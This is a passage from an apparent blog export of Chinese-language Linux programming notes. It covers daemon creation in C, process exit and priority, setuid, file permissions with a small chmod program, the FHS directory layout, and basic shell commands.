<span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syslog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/param.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_daemon</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">int</span> pid; </span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1）屏蔽一些控制终端操作的信号</span></span><br><span class="line">signal(SIGTTOU,SIG_IGN); </span><br><span class="line">signal(SIGTTIN,SIG_IGN); </span><br><span class="line">signal(SIGTSTP,SIG_IGN); </span><br><span class="line">signal(SIGHUP ,SIG_IGN);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 2）在后台运行</span></span><br><span class="line">    <span class="keyword">if</span>( pid=fork() )&#123; <span class="comment">// 父进程</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">//结束父进程，子进程继续</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid&lt; <span class="number">0</span>)&#123; <span class="comment">// 出错</span></span><br><span class="line">perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3）脱离控制终端、登录会话和进程组</span></span><br><span class="line">setsid();  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 4）禁止进程重新打开控制终端</span></span><br><span class="line"><span class="keyword">if</span>( pid=fork() )&#123; <span class="comment">// 父进程</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);      <span class="comment">// 结束第一子进程，第二子进程继续（第二子进程不再是会话组长） </span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid&lt; <span class="number">0</span>)&#123; <span class="comment">// 出错</span></span><br><span class="line">perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 5）关闭打开的文件描述符</span></span><br><span class="line"><span class="comment">// NOFILE 为 &lt;sys/param.h&gt; 的宏定义</span></span><br><span class="line"><span class="comment">// NOFILE 为文件描述符最大个数，不同系统有不同限制</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt; NOFILE; ++i)&#123;</span><br><span class="line">close(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6）改变当前工作目录</span></span><br><span class="line">chdir(<span class="string">&quot;/&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 7）重设文件创建掩模</span></span><br><span class="line">umask(<span class="number">0</span>);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 8）处理 SIGCHLD 信号</span></span><br><span class="line">signal(SIGCHLD,SIG_IGN);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">init_daemon();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/qW14fjEDrHQdXMK.png" alt="image-20210207213739752"></p><h2 id="进程退出"><a href="#进程退出" class="headerlink" title="进程退出"></a>进程退出</h2><p>方式：</p><ul><li>正常退出<ul><li>在main函数中执行return</li><li>调用 <code>exit</code> 函数 （头文件<code>stdlib.h</code>）</li><li>调用 <code>_exit</code> 函数 （头文件<code>unistd.h</code>）</li></ul></li><li>异常退出<ul><li>调用 <code>about</code> 函数</li><li>进程收到某个信号，该信号使程序终止。</li></ul></li></ul><h2 id="改变进程的优先级"><a href="#改变进程的优先级" class="headerlink" title="改变进程的优先级"></a>改变进程的优先级</h2><p>改变进程的优先级是通过系统调用<code>nice</code>函数改变。</p><p><code>man 2 nice </code> 命令获取该函数的声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nice</span><span class="params">(<span class="keyword">int</span> inc)</span></span>;</span><br></pre></td></tr></table></figure><p>相关的两个重要函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getpriority                           该函数返回一组进程的优先级。</span><br><span class="line">setpriority                           该函数用来设置制定进程的优先级。</span><br></pre></td></tr></table></figure><h2 id="setuid函数"><a href="#setuid函数" class="headerlink" title="setuid函数"></a>setuid函数</h2><p>可以用 <code>setuid</code> 设置实际用户 ID 和有效用户 ID 。</p><blockquote><p>内核检查一个进程是否具有访问某文件的权限时，是使用进程的有效用户 ID 来进行检查的。<code>su</code> 程序的文件属主是 root,普通用户运行 <code>su</code> 命令时，<code>su</code> 进程的权限是root权限。</p></blockquote><blockquote><p>注意，因为Linux系统中root用户拥有最高权力，黑客们往往喜欢寻找设置了<code>set_uid</code>位的可执行程序的漏洞。这样的程序如果存在缓冲区溢出漏洞，并且该程序是一个网络程序。那么黑客可以从远程的地方轻松的利用该漏洞获得运行该漏洞程序的主机的root权限。即使这样的程序不是网络程序，那么也可以使本机上的恶意普通用户提升为root用户。</p></blockquote><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><blockquote><p>关于章末的编程实践：实现自己的 myshell，奈何能力不够，对我来说是很难实现了。这里依然给出学长的代码，可作日后欣赏。(滑稽-&gt; &lt;-)</p><p><a href="https://github.com/Evil-crow/Linux_C/tree/master/Chapter_VII/Shell">https://github.com/Evil-crow/Linux_C/tree/master/Chapter_VII/Shell</a></p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] Linux C 编程实战第七章进程控制</p><p>[2] <a href="https://blog.csdn.net/mijichui2153/article/details/81394387">创建守护进程的步骤</a></p><p>[3] <a href="https://tennysonsky.blog.csdn.net/article/details/45970087?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">Linux系统编程——特殊进程之守护进程</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux C编程实战之文件操作学习记录</title>
      <link href="posts/46255.html"/>
      <url>posts/46255.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>在 Linux 中，用户可以使用命令对文件进行各种操作，而几条简单命令背后却是大段大段的程序实现代码。Linux C 编程实战第六章文件操作中关于文件的创建，打开，读写，关闭，删除，属性等内容十分详实，这里只是对文件权限和目录配置的内容进行简单记录。</p></blockquote><h1 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h1><p>文件主要包含两方面内容：</p><ul><li>文件本身包含的数据</li><li>文件的属性，包括文件访问权限、所有者、文件大小、创建日期等。</li></ul><h1 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h1><p>在 Linux 中我们可以使用 <code>ll</code> 或者 <code>ls –l</code> 命令来显示一个文件的属性以及文件所属的用户和组，如</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U8ItepXPJgNDua9.png"></p><p>上面的运行结果从左至右依次是：文件属性、文件数、所属的用户、所属的用户所在的组、文件大小（单位bytes）、文件创建时间、文件名。</p><p>每个文件的属性由左边第一部分的 10 个字符来确定（如下图）。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/6BRKPAWq7rnzxSd.png" alt="image-20210208214725950"></p><p>文件类型：</p><ul><li><code>-</code> 表示普通文件</li><li><code>d</code> 表示目录文件</li><li><code>l</code> 表示链接文件，比如快捷方式</li><li><code>s</code> 套接字文件</li><li><code>c</code> 字符设备文件，比如<code>/dev/</code>中的很多文件</li><li><code>b</code> 表示块设备文件，比如一些磁盘</li><li><code>p</code> 管道文件</li></ul><h2 id="chmod-change-model-改变权限"><a href="#chmod-change-model-改变权限" class="headerlink" title="chmod(change model) 改变权限"></a>chmod(change model) 改变权限</h2><p>对文件的访问权限的修改通过命令 <code>chmod</code> 来进行，如，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 test.c</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/jUZPQhJbiuYq3GI.png" alt="image-20210208221801438"></p><p>对于可读，可写，可执行三种权限，它们分别对应一个值，<strong>r = 4, w = 2, x = 1</strong></p><p>4+2+1=7，777 表示将test.c 的访问权限修改为：所有者，所属组，其他用户都有读，写，执行的权限。 </p><blockquote><p>r：可读，意思是指可以读取文件的内容</p><p>w：可写，意思就是可以修改文件的内容</p><p>x：可执行，与windows不同，linux下文件可执行与否与后缀名无关，而与x权限属性相关</p></blockquote><p>简化版chmod 命令 <code>my_chmod.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc ,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mod,mod_u,mod_g,mod_o;</span><br><span class="line">    <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;<span class="comment">//检查参数合法性</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s &lt;chmod num&gt;&lt;path&gt;\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mod=atoi(argv[<span class="number">1</span>]);<span class="comment">//将字符串转换成整数</span></span><br><span class="line">    <span class="keyword">if</span>(mod&gt;<span class="number">777</span>||mod&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mod num error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mod_u=mod/<span class="number">100</span>;<span class="comment">//所有者权限</span></span><br><span class="line">    mod_g=(mod-mod_u*<span class="number">100</span>)/<span class="number">10</span>;<span class="comment">//所属组权限</span></span><br><span class="line">    mod_o=mod-mod_u*<span class="number">100</span>-mod_g*<span class="number">10</span>;<span class="comment">//其他用户权限</span></span><br><span class="line">    mod=mod_u*<span class="number">8</span>*<span class="number">8</span>+mod_g*<span class="number">8</span>+mod_o;<span class="comment">//八进制转换</span></span><br><span class="line">    path=argv[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span>(chmod(path,mod)==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;chmod error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/lpTEnPzkKgAc1oe.png" alt="image-20210208223940269"></p><p>可见 test.c 文件的权限已被修改。</p><h2 id="chgrp-change-group-改变用户组"><a href="#chgrp-change-group-改变用户组" class="headerlink" title="chgrp(change group) 改变用户组"></a>chgrp(change group) 改变用户组</h2><p>重要参数：<code>-R</code> 递归改变权限，即把该目录下的文件，目录的权限全部同步修改，很好用，也很危险！</p><p>语法： <code>chgrp [-R] group dirname/filename </code> (目录/文件名）</p><p>如下例所示：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/HNysAV21rWGIKpJ.png" alt="image-20210214083539619"></p><h2 id="chown-change-owner-改变用户"><a href="#chown-change-owner-改变用户" class="headerlink" title="chown(change owner) 改变用户"></a>chown(change owner) 改变用户</h2><p>重要参数：同上 [-R]，递归更改用户</p><p>语法：<code>chown [-R] owner dirname/filename</code> 改变所属用户</p><p> <code>chown [-R] owner:group dirname/filename</code>  改变所属用户，用户组</p><p><code> chown [-R] .group dirname/filename</code>  改变所属用户组</p><p>如下例所示：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/brRZeJ75j8DLtXu.png" alt="image-20210214084556022"></p><h1 id="目录配置"><a href="#目录配置" class="headerlink" title="目录配置"></a>目录配置</h1><p>linux系统的发行版本众多，如果更换一个版本的Linux系统，就需要重新学习Linux系统的目录配置，岂不是很麻烦？？？所以制定了FHS，即 Filesystem Hierarchy Standard(文件系统配置标准)，以此来进行目录配置规范。</p><p>FHS标准对于Ｌinux系统的目录配置文件，只定义了三层目录配置：</p><blockquote><p>/ (root)目录：与开机系统有关</p><p>/usr目录：与软件安装/执行有关</p><p>/var目录：与系统运作过程有关</p></blockquote><h2 id="根目录"><a href="#根目录" class="headerlink" title="/ 根目录"></a>/ 根目录</h2><p>/ 根目录，是Linux系统中最重要的一个目录了！所有的目录都是由根目录所衍生出来的，而且根目录还与机器的开机，还原，系统修复有关。根目录下的一些目录：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/84qnhEpZfl6wuOt.png" alt="image-20210214215243141"></p><table><thead><tr><th align="center">目录</th><th align="center">应放置的文件内容</th></tr></thead><tbody><tr><td align="center">/bin</td><td align="center">bin为binary的简写，主要放置系统的必备执行文件，例如：cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。</td></tr><tr><td align="center">/boot</td><td align="center">/boot中存放内核文件以及开机配置文件</td></tr><tr><td align="center">/dev</td><td align="center">之前讲一切皆文件，/dev目录下都是设备文件</td></tr><tr><td align="center">/etc</td><td align="center">系统的主要配置文件都存放在此处</td></tr><tr><td align="center">/home</td><td align="center">home目录即为用户目录</td></tr><tr><td align="center">/lib</td><td align="center">系统开机时所用到的函数库</td></tr><tr><td align="center">/media</td><td align="center">“媒体”，指软盘，光盘等设备</td></tr><tr><td align="center">/mnt</td><td align="center">用于暂时挂载的目录</td></tr><tr><td align="center">/opt</td><td align="center">用于给第三方软件放置的目录</td></tr><tr><td align="center">/root</td><td align="center">系统管理员目录</td></tr><tr><td align="center">/sbin</td><td align="center">主要放置系统管理的必备程序，例如：dump、halt、ifconfig、ifup、 ifdown、init、reboot、rmmod、 runlevel、shutdown等。</td></tr><tr><td align="center">/tmp</td><td align="center">一般用户或者暂时放置数据的地方</td></tr><tr><td align="center">/lost+found</td><td align="center">文件系统发生错误时,将一些丢失的片段放在该目录下</td></tr><tr><td align="center">/proc</td><td align="center">该目录是一个虚拟的文件系统,放置的数据都是在内存当中的,例如系统的内核,进程,外部设备的状态,网络状态等</td></tr><tr><td align="center">/sys</td><td align="center">存放着已加载的内核模块和内核监测到的硬件设备信息等</td></tr></tbody></table><h2 id="usr-目录"><a href="#usr-目录" class="headerlink" title="/usr 目录"></a>/usr 目录</h2><p>/usr(UNIX Software Resource)是与软件的安装/执行有关的目录，所存放的是<strong>可分享的</strong>与<strong>不可变动的</strong>数据文件。其下目录有：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/W8gxSdt43OComTi.png" alt="image-20210214220013565"></p><table><thead><tr><th>目录</th><th>应放置的文件内容</th></tr></thead><tbody><tr><td>/usr/bin/</td><td>绝大部分的用户可使用命令都在此处</td></tr><tr><td>/usr/include/</td><td>C/C++的头文件,包含文件都在此处</td></tr><tr><td>/usr/lib/</td><td>各类应用软件的函数库,目标文件以及一些非惯用的执行文件或脚本</td></tr><tr><td>/usr/local/</td><td>用户自行安装的软件都在此处,区别于发行版自带的软件</td></tr><tr><td>/usr/sbin/</td><td>非系统正常运行所需要的系统命令</td></tr><tr><td>/usr/share/</td><td>放置共享文件</td></tr><tr><td>/usr/src/</td><td>一般源码存放在这里,而内核源码存放在/usr/src/linux下</td></tr></tbody></table><p>显然，/usr与 / 下有不少相同的目录,接下来就看看它们的区别:</p><ul><li>/bin 与 /usr/bin</li></ul><p>/bin是根目录下的目录,其与开机过程有关,所以要放在开机时就挂载的/目录下</p><p>/usr/bin 中存放的也是一般用户所能用到的大多数命令,但是与开机过程不挂钩</p><ul><li>/lib 与 /usr/lib</li></ul><p>/lib中放置的是在开机时首先会用到的函数库</p><p>/usr/lib中放置的则是各种应用软件的函数库,不一定开机时会用到</p><ul><li>/sbin 与 /usr/sbin</li></ul><p>/sbin中存放的是超级用户 root一般使用的命令放置着系统管理所必须的程式</p><p>/usr/sbin中放置的则不一定是系统正常运行所必须的系统指令</p><ul><li>/opt 与 /usr/local</li></ul><p>/opt目录下存放第三方软件,即并非发行版Linux安装时就装的软件</p><p>/usr/local目录下存放系统管理员在本机安装的软件,一般经由 apt 或 yum 安装的软件都放置于此</p><h2 id="var-目录"><a href="#var-目录" class="headerlink" title="/var 目录"></a>/var 目录</h2><p>/var (variable)是与系统运作过程有关的目录。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/a8OuiWyFYDneA2C.png" alt="image-20210214221639768"></p><table><thead><tr><th>目录</th><th>放置的文件内容</th></tr></thead><tbody><tr><td>/var/cache/</td><td>应用程序本身产生的缓存文件</td></tr><tr><td>/var/lib</td><td>程序运行时需要的数据放置的目录</td></tr><tr><td>/var/lock</td><td>程序锁,对于只能同时一个用户使用的程序上锁,防止两人同时使用</td></tr><tr><td>/var/log</td><td>登录文件放置的目录</td></tr><tr><td>/var/mail</td><td>个人信箱的目录</td></tr><tr><td>/var/run</td><td>程序的PID放置目录</td></tr><tr><td>/var/spool</td><td>通常放置一些队列数据</td></tr></tbody></table><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><blockquote><p>关于章末的编程实践：实现自己的 ls 命令，这里先给出学长的代码，待日后再细品。(滑稽-&gt; &lt;-)</p><p><a href="https://blog.csdn.net/qq_45858169/article/details/105193172">Linux系统编程：my_ls(l、R、A、r、n、h、i、颜色的实现)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之常用命令</title>
      <link href="posts/18120.html"/>
      <url>posts/18120.html</url>
      
        <content type="html"><![CDATA[<p>在了解Linux 常用命令之前，有必要知道以下两个概念。</p><h1 id="Linux-终端"><a href="#Linux-终端" class="headerlink" title="Linux 终端"></a>Linux 终端</h1><p>Linux 把显示器和键盘合称为终端，因为它们可以对系统进行控制并且可以用软件的方式来实现，所以又称为虚拟控制台。</p><h1 id="Linux-Shell"><a href="#Linux-Shell" class="headerlink" title="Linux Shell"></a>Linux Shell</h1><p>在终端上，通过输入Shell 命令来控制和使用计算机。Shell 是一个命令解释器，它通过接受用户输入的命令来启动、暂停、停止程序的运行或对计算机进行控制。</p><p>Shell有两种提示符：以**#**为提示符表明该终端是由root 用户打开的，root用户具有系统最高权限，因此可以输入任何可用的命令，而一般用户打开的终端的提示符是 $ 。提示符的其他部分分别表示：[登录用户名@主机名当前目录]。</p><p>Shell命令的基本格式是:<br>命令名  [选项]  &lt;参数1&gt;  &lt;参数2&gt;.…..</p><p>其中方括号中的选项对命令来说是可选的，一条命令可以有0个或多个参数。选项是对命令的特别定义，也可以理解为选项告诉命令具体做什么。选项通常以“-”开始，后接一个或多个字母，如 ls-al，有的选项以“–”开头，后面一般跟着一个单词，比如–number。很多“–”格式的选项可以用“-”加上第一个字母来替代，如–number_可以用-n来替代。在 Shell下输入相应的命令并按回车键，Shell就执行命令。如果没有此命令，Shell会提示·“command not found”，表明没有这个命令。Shell 命令是区分大小写的，一条命令只要有一个字母的大小写发生变化，系统就认为是一条不同的命令。可以用分号“;”来连接多个命令，Shell 会依次执行这些命令。</p><h1 id="man-page-与-info-page"><a href="#man-page-与-info-page" class="headerlink" title="man page 与 info page"></a>man page 与 info page</h1><p>Linux命令数量众多，你能完全掌握它们的功能吗？你能了解它们的每一个选项，每一个参数吗？这个时候就需要用到强大的在线求助 <strong>man page</strong></p><p>man 也是命令，为manual(操作说明）<code>man command</code>即可显示此命令的操作说明。</p><p>举个例子：</p><p>man ls 即可显示关于 ls 命令的所有内容，包括其用法，等级，相关环境参数等一系列信息</p><p>而使用 man命令时会进入一个界面，此即所谓的 man page，在其中也可以使用许多快捷键进行操作。</p><blockquote><p>可以说，通过man命令即可了解到所有的命令相关的操作说明。虽然Linux中有许多许多的命令，你背不完所有的命令，你也不需要背所有的命令，记住平时常用的命令，然后灵活使用man 与 Tab键补全即可完成许多操作。</p></blockquote><p>info page的用法与 man page基本类似，但是，在info中将文件数据折叠成一个个段落，更方便使用者的查询与查看。</p><h1 id="几个简单命令"><a href="#几个简单命令" class="headerlink" title="几个简单命令"></a>几个简单命令</h1><ul><li><code>date</code> 显示当前日期与时间</li><li><code>cal</code> 显示本月日历；<code>cal [month] [year]</code> 显示指定时间日历</li><li><code>bc</code> 打开计算器（数据默认整型）；可通过<code>scale = number</code> 保留小数位数，number即为要保留的小数位数；<code>quit</code> 退出计算器</li><li> <code>pwd</code> 显示当前目录的路径</li><li> <code>du -h file</code> 查看文件大小</li><li> <code>useradd zhang3</code> 创建新用户张三</li><li> <code>passwd zhang3</code> 设置用户密码</li><li> <code>chpasswd zhang3</code> 更改用户密码</li><li> <code>userdel zhang3</code> 删除用户张三</li></ul><h1 id="几个常用热键"><a href="#几个常用热键" class="headerlink" title="几个常用热键"></a>几个常用热键</h1><ul><li>&lt; Tab &gt;键补全 </li></ul><p>输入命令、目录名或文件名的开头一个或几个字母后按下 <strong>&lt; Tab &gt;键</strong>，Shell 会在相应目录里进行匹配，自动补齐命令、目录名或文件名。在命令、目录名或文件名很长或难以记忆时，自动补齐功能会很有用。</p><ul><li>&lt;↑&gt;和&lt;↓&gt;键</li></ul><p>可以通过按&lt;↑&gt;或&lt;↓&gt;键来显示执行过的命令，这在重复执行某些命令时会给用户带来很大的便利。</p><ul><li>&lt; Ctrl &gt; + C 终止进程</li></ul><p>有时候避免不了的，会进行了错误的进程，那么怎么办？按下&lt; Ctrl&gt; + C可以解决这个而问题，会强制终止进程。虽然好用，但是有的时候，也需要谨慎使用，不能肆意使用，否则会引起重大错误的出现。</p><ul><li>&lt; Ctrl &gt; + D 结束输入</li></ul><p>使用&lt; Ctrl &gt; + D可迅速结束从键盘的输入，相当于输入exit()一样。</p><ul><li>&lt; Ctrl &gt; + L  清理屏幕</li></ul><h1 id="文件与目录管理常用命令"><a href="#文件与目录管理常用命令" class="headerlink" title="文件与目录管理常用命令"></a>文件与目录管理常用命令</h1><h2 id="cd-改变当前目录命令"><a href="#cd-改变当前目录命令" class="headerlink" title="cd 改变当前目录命令"></a>cd 改变当前目录命令</h2><p>格式：cd &lt;目录名&gt;</p><p>例如：执行命令 <code>cd/home/admin</code>，则切换到目录/home/admin 下。</p><p>例如：执行命令 <code>cd～</code>，则当前目录位于用户的主目录下。</p><p>例如：执行命令 <code>cd.. </code>，切换到当前目录的父目录。</p><p>例如：执行命令 <code>cd - </code>，切换到前一个目录。</p><h2 id="ls-显示目录或文件信息命令"><a href="#ls-显示目录或文件信息命令" class="headerlink" title="ls 显示目录或文件信息命令"></a>ls 显示目录或文件信息命令</h2><p>格式：ls [选项] &lt;目录或文件名&gt;</p><p>主要选项如下：<br>-a：显示所有的文件和目录。</p><p>-l：以长格式显示文件信息。</p><p>-t：将结果按修改时间进行排序，新的文件或目录排在前面。</p><h2 id="cat-文件内容查看和连接命令"><a href="#cat-文件内容查看和连接命令" class="headerlink" title="cat 文件内容查看和连接命令"></a>cat 文件内容查看和连接命令</h2><p>格式：cat [选项] &lt;文件1&gt; &lt;文件2&gt; ….</p><p>该命令用于把几个文件的内容连接后显示在屏幕上。主要选项如下：</p><p>-n：对内容进行按行编号输出。</p><p>例如：执行命令<code>cat -n test.c</code>，表示将文件test.c的内容加上行号后显示输出。<br>例如：执行命令<code>cat test1.c test2.c</code>，表示将文件test1.c和 test2.c的内容串接在一起并输出。</p><blockquote><p>针对比较大的文件，我们就可以使用<code>less</code>命令打开某个文件。类似vim，less可以在输入<code>/</code>后进入查找模式，然后按<code>n</code>(N)向下(上)查找。<code>空格</code> 向下滚屏翻页，<code>b</code> 向上滚屏翻页， <code>q</code> 退出less</p></blockquote><h2 id="cp-文件复制命令"><a href="#cp-文件复制命令" class="headerlink" title="cp 文件复制命令"></a>cp 文件复制命令</h2><p>格式：cp [选项] &lt;源文件或目录&gt; &lt;目标文件或目录&gt;</p><p>该命令用于把一个文件拷贝到另一个文件或将多个文件拷贝到一个目录下。主要选项如下：</p><p>-r：若源目录下还有文件或目录，则都拷贝到目的地。</p><p>-f：若目标目录下已经有同名的文件，则把它删除并把源文件拷贝到目标目录下。</p><p>例如：执行命令<code>cp test.c tmp/program.c</code>，表示把当前目录下的test.c文件拷贝到/tmp目录下并命名为program.c</p><h2 id="mkdir-创建目录命令"><a href="#mkdir-创建目录命令" class="headerlink" title="mkdir 创建目录命令"></a>mkdir 创建目录命令</h2><p>格式：mkdir [选项] &lt;目录&gt;</p><p>如果指定目录不存在则创建它。主要选项如下：</p><p>-p：若要建立的目录的上层目录不存在，则先创建它。</p><p>例如：执行命令<code>mkdir-p dir1/dir2</code>，表示在当前目录下创建dir1/dir2，如果dir1不存在则先创建它。</p><h2 id="touch-创建文件命令"><a href="#touch-创建文件命令" class="headerlink" title="touch 创建文件命令"></a>touch 创建文件命令</h2><p>格式：touch &lt;文件&gt;</p><p>例如：执行命令<code> touch test.c</code> 在当前目录下创建一个文件test.c，前提是test.c文件不存在。</p><h2 id="rm-删除文件命令"><a href="#rm-删除文件命令" class="headerlink" title="rm 删除文件命令"></a>rm 删除文件命令</h2><p>格式：rm [选项] &lt;文件或目录&gt;</p><p>该命令用于删除文件，主要选项如下：</p><p>-r：若目录非空,则删除目录下所有的文件。</p><p>-f：强制删除。<br>例如：执行命令<code>rm *.c</code>，表示删除当前目录下所有以.c结尾的文件。<br>例如：执行命令<code>rm -rf tyq</code>，表示强制删除 tyq目录下所有的文件和子目录，子目录下的文件或目录都被删除。</p><h2 id="rmdir-删除目录命令"><a href="#rmdir-删除目录命令" class="headerlink" title="rmdir 删除目录命令"></a>rmdir 删除目录命令</h2><p>格式：mkdir [选项] &lt;目录&gt;</p><p>如果指定目录为空就删除它，若不为空则出现错误信息。主要选项如下：</p><p>-p：当删除指定目录后,若该目录的父目录为空,则也将其删除。</p><p>例如：执行命令<code>rmdir -p dir1/dir2</code>，表示在当前目录下的dir1目录中删除dir2子目录，若删除dir2后dir1变为空目录，则也将其删除。</p><h2 id="mv-移动或重命名文件命令"><a href="#mv-移动或重命名文件命令" class="headerlink" title="mv 